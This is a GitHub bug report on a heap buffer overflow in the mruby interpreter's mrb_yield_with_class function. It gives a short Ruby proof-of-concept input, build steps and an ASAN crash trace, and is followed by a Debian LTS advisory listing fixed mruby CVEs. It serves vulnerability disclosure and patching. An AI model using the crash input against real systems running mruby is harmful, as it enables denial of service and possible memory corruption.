=== Content from github.com_334f0bfd_20250119_125311.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F5042)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F5042)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=mruby%2Fmruby)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mruby](/mruby)
/
**[mruby](/mruby/mruby)**
Public

* [Notifications](/login?return_to=%2Fmruby%2Fmruby) You must be signed in to change notification settings
* [Fork
  793](/login?return_to=%2Fmruby%2Fmruby)
* [Star
   5.3k](/login?return_to=%2Fmruby%2Fmruby)

* [Code](/mruby/mruby)
* [Issues
  126](/mruby/mruby/issues)
* [Pull requests
  36](/mruby/mruby/pulls)
* [Discussions](/mruby/mruby/discussions)
* [Actions](/mruby/mruby/actions)
* [Projects
  0](/mruby/mruby/projects)
* [Wiki](/mruby/mruby/wiki)
* [Security](/mruby/mruby/security)
* [Insights](/mruby/mruby/pulse)

Additional navigation options

* [Code](/mruby/mruby)
* [Issues](/mruby/mruby/issues)
* [Pull requests](/mruby/mruby/pulls)
* [Discussions](/mruby/mruby/discussions)
* [Actions](/mruby/mruby/actions)
* [Projects](/mruby/mruby/projects)
* [Wiki](/mruby/mruby/wiki)
* [Security](/mruby/mruby/security)
* [Insights](/mruby/mruby/pulse)

# Heap buffer overflow in mruby interpreterÂ #5042

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Heap buffer overflow in mruby interpreter](#top)#5042Copy link![@prashast](https://avatars.githubusercontent.com/u/4888795?u=9c85669d8a8e4ea8b21396866a31940bb9ee172d&v=4&size=80)
## Description

![@prashast](https://avatars.githubusercontent.com/u/4888795?u=9c85669d8a8e4ea8b21396866a31940bb9ee172d&v=4&size=48)[prashast](https://github.com/prashast)opened [on Jul 20, 2020](https://github.com/mruby/mruby/issues/5042#issue-662278596)

A heap buffer overflow exists in `mrb_yield_with_class` function in `src/vm.c:767` triggered via `stack_copy`. The bug can be detected on Ubuntu-18.04 64-bit with ASAN-enabled mruby. It has been reproduced with mruby compiled with different compiler toolchains: `clang-9, clang-10, gcc-7.5`. The POC input and steps to reproduce are provided below.

# POC Input

```
c=singleton_methods.sample( )
d=singleton_methods.method(c)
d=d.call(d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d)

```
# Steps to reproduce

```
git clone https://github.com/mruby/mruby
cd mruby
CC=clang LDFLAGS="-fsanitize=address" CFLAGS="-fsanitize=address -g" make -j`nproc`
./bin/mruby poc.rb

```
# ASAN Report

```
=================================================================
==9655==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000004d20 at pc 0x000000493c50 bp 0x7ffca1f00c60 sp 0x7ffca1f00428
WRITE of size 16 at 0x621000004d20 thread T0
    #0 0x493c4f in __asan_memcpy (/tmp/mruby/bin/mruby+0x493c4f)
    #1 0x59be83 in stack_copy /tmp/mruby/src/vm.c:123:14
    #2 0x5a6acf in mrb_yield_with_class /tmp/mruby/src/vm.c:767:5
    #3 0x7e0c8f in mcall /tmp/mruby/mrbgems/mruby-method/src/method.c:131:11
    #4 0x7dacb2 in method_call /tmp/mruby/mrbgems/mruby-method/src/method.c:148:10
    #5 0x5b9819 in mrb_vm_exec /tmp/mruby/src/vm.c:1437:18
    #6 0x5a9054 in mrb_vm_run /tmp/mruby/src/vm.c:935:12
    #7 0x60090f in mrb_top_run /tmp/mruby/src/vm.c:2836:12
    #8 0x6418ed in mrb_load_exec /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:6512:7
    #9 0x6425fd in mrb_load_file_cxt /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:6521:10
    #10 0x4c58cf in main /tmp/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:331:11
    #11 0x7f7459aaeb96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310
    #12 0x41c009 in _start (/tmp/mruby/bin/mruby+0x41c009)

0x621000004d20 is located 0 bytes to the right of 4128-byte region [0x621000003d00,0x621000004d20)
allocated by thread T0 here:
    #0 0x494a69 in realloc (/tmp/mruby/bin/mruby+0x494a69)
    #1 0x612045 in mrb_default_allocf /tmp/mruby/src/state.c:68:12
    #2 0x5249ab in mrb_realloc_simple /tmp/mruby/src/gc.c:211:8
    #3 0x524fc4 in mrb_realloc /tmp/mruby/src/gc.c:225:8
    #4 0x59b3d9 in stack_extend_alloc /tmp/mruby/src/vm.c:205:27
    #5 0x59af08 in mrb_stack_extend /tmp/mruby/src/vm.c:226:5
    #6 0x5a8f1d in mrb_vm_run /tmp/mruby/src/vm.c:932:3
    #7 0x60090f in mrb_top_run /tmp/mruby/src/vm.c:2836:12
    #8 0x6418ed in mrb_load_exec /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:6512:7
    #9 0x6425fd in mrb_load_file_cxt /tmp/mruby/mrbgems/mruby-compiler/core/parse.y:6521:10
    #10 0x4c58cf in main /tmp/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:331:11
    #11 0x7f7459aaeb96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

SUMMARY: AddressSanitizer: heap-buffer-overflow (/tmp/mruby/bin/mruby+0x493c4f) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c427fff8950: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427fff8990: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c427fff89a0: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff89b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff89c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff89d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff89e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427fff89f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==9655==ABORTING

```
# Authors

Prashast Srivastava (Purdue University) , Mathias Payer (EPFL)

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from lists.debian.org_1a2d9dd8_20250119_125312.html ===


---

[[Date Prev](msg00005.html)][[Date Next](msg00007.html)]
[[Thread Prev](msg00005.html)][[Thread Next](msg00007.html)]
[[Date Index](maillist.html#00006)]
[[Thread Index](threads.html#00006)]

# [SECURITY] [DLA 2996-1] mruby security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2996-1] mruby security update
* *From*: Abhijith PA <abhijith@debian.org>
* *Date*: Fri, 6 May 2022 13:53:30 +0530
* *Message-id*: <[[ğ]](/msgid-search/YnTbAhG%2BNinH29bs%40disroot.org)Â [YnTbAhG+NinH29bs@disroot.org](msg00006.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-2996-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                          Abhijith PA
May 06, 2022                                  <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : mruby
Version        : 1.2.0+20161228+git30d5424a-1+deb9u1
CVE ID         : CVE-2017-9527 CVE-2018-10191 CVE-2018-11743 CVE-2018-12249
                 CVE-2018-14337 CVE-2020-15866

Multiple security issues were discovered in mruby, a lightweight
implementation of the Ruby language

CVE-2017-9527

    heap-based use-after-free vulnerability allows attackers to cause
    a denial of service or possibly have unspecified other impact via
    a crafted .rb file

CVE-2018-10191

    an integer overflow exists when handling OP_GETUPVAR in the
    presence of deep scope nesting, resulting in a use-after-free. An
    attacker that can cause Ruby code to be run can use this to
    possibly execute arbitrary code

CVE-2018-11743

    uninitialized pointer which allows attackers to cause a denial of
    service or possibly have unspecified other impact.

CVE-2018-12249

    There is a NULL pointer dereference in mrb_class_real because
    "class BasicObject" is not properly supported in class.c.

CVE-2018-14337

    a signed integer overflow, possibly leading to out-of-bounds
    memory access because the mrb_str_resize function in string.c does
    not check for a negative length

CVE-2020-15866

    a heap-based buffer overflow in the mrb_yield_with_class function
    in vm.c because of incorrect VM stack handling

For Debian 9 stretch, these problems have been fixed in version
1.2.0+20161228+git30d5424a-1+deb9u1.

We recommend that you upgrade your mruby packages.

For the detailed security status of mruby please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/mruby>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEE7xPqJqaY/zX9fJAuhj1N8u2cKO8FAmJ02wIACgkQhj1N8u2c
KO9D5Q/9HNnc1LRSZ7lJm8+yE+sN9Pd+58VprfzlSC5VQoxkRM0UBMUPrDzfLyTj
fs6rUn6tt78+XTorGj2nkB4REzEXVAcsdq09BZTs5kdQmYHxK1wSOcQKj6Dc5r34
jQcExVJvjWehqjKc7Y75OXIBCzzh7qBZnyDdM80Buaz1i4nSCpUCnFpcNLrlIhP5
AvYSuRyMBXTgPHY4XDvgBCMSuwq+Y5hf+6PWJXH/S/9g51lfvgz0dvhzR+zM2oQH
70CKeGVYhWugqpXFXlSFijeaDZAY2rBZCYvLvWistPSvNUVabrARaYNZPiAjGjYh
Z/k8tYKyV7pIv3sJft/8cMmK3hqQ9ZDrvPH0r9qBE0WfD/syexcpM2VHKSOQU+4n
nAWIo1TIp9vx5ob23vr+i/sg3CxRR5XeMLBrCGKsBqJBDnubRnJm/Zgm+euLgmDd
tCLOZG+KzNcf4Qtv5DlmpmKMFvbFRrEuYjPoQvKjykc/XqKnXel7VsW2yU4Qnr4l
5vOSBe1G2fXcJmYoPo1AB5LUBgYKygmEfX6WGXA9fdK5P3/JXBYUCo6c+AGTxEFZ
wcBKrc9f0LgwC65/mioAT02BRGQ4BjWeYbV38uX9f3KW8g+DnAaS7ao90ySMDu+d
lZEMt63HrehZxJheZMuqNdkHjeDiaLcZSjR15d460064SC2CbqM=
=b/x/
-----END PGP SIGNATURE-----

```

---


